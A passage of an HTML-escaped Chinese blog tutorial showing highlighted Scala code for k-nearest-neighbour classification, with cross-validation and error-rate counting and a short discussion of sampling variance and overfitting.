&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;testDataWithIndices&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-35&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;collectFirst&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dp&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dp&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-36&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-37&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-38&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;validationRoundRecords&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;trainingDPSets&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-39&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;zipWithIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;           &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-40&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;trainingClassifierSets&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-41&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;testingDPSets&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-42&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;testingClassifierSets&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-43&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                               &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-44&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-45&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-46&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;validationRoundRecords&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-47&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-48&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-49&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;knn&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;KNN&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;learn&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-50&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-51&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//And for each test data point make a prediction with the model&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-52&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//对每个测试数据点，用模型做一次预测&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-53&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;predictions&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;record&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-54&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;_3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-55&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;knn&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;predict&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-56&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;zipWithIndex&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-57&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-58&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Finally evaluate the predictions as correct or incorrect&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-59&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//and count the amount of wrongly classified data points.&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-60&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//最后检验预测结果正确与否，并记下被错误分类的数据点的个数&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-61&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-62&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;predictions&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-63&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-64&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;sum&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-65&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-66&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;False prediction rate: &quot;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;predictions&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e &quot;&gt;length *&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;%&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06132f102130773-67&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06132f102130773-68&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0106 seconds] --&gt;
&lt;p&gt;如果你多次执行上面这段代码，你可能发现错误预测率会有一些波动。这是由于用来做训练和测试的随机样本。如果不幸地取到不好的随机样本，误差率会比较高，若取到好的随机样本，则误差率会极低。&lt;/p&gt;
&lt;p&gt;不幸的是，关于如何为模型选取最好的随机样本来训练，我没有这样的黄金法则。也许有人会说，产生最小误差率的模型总是最好的。不过，再回顾一下过拟合这个概念，选用这样的特殊模型也可能会对新数据束手无策。这就是为什么获得一个足够大且具有代表性的数据集对一个成功的机器学习应用来说非常关键。然而，当遇到这种问题时，你可以用新的数据和已知的正确分类不断更新模型。&lt;/p&gt;
&lt;p&gt;我们概括一下目前为止的进展状况。首先小心地选取训练和测试数据；下一步，建立几个模型并验证，选出给出最好结果的模型。接下来我们到达最后一步，就是用这个模型做预测：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061334473292021&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
val knn = KNN.learn(record._1, record._2, 3)
val unknownDataPoint = Array(5.3, 4.3)
val result = knn.predict(unknownDatapoint)
if (result == 0)
{
    println(&quot;Internet Service Provider Alpha&quot;)
}
else if (result == 1)
{
    println(&quot;Internet Service Provider Beta&quot;)
}
else
{
    println(&quot;Unexpected prediction&quot;)
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061334473292021-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061334473292021-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061334473292021-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061334473292021-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061334473292021-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061334473292021-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061334473292021-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061334473292021-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061334473292021-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061334473292021-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061334473292021-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061334473292021-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061334473292021-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061334473292021-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061334473292021-15&quot;&gt;15&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061334473292021-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;knn&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;KNN&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;learn&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061334473292021-2&quot;&gt;
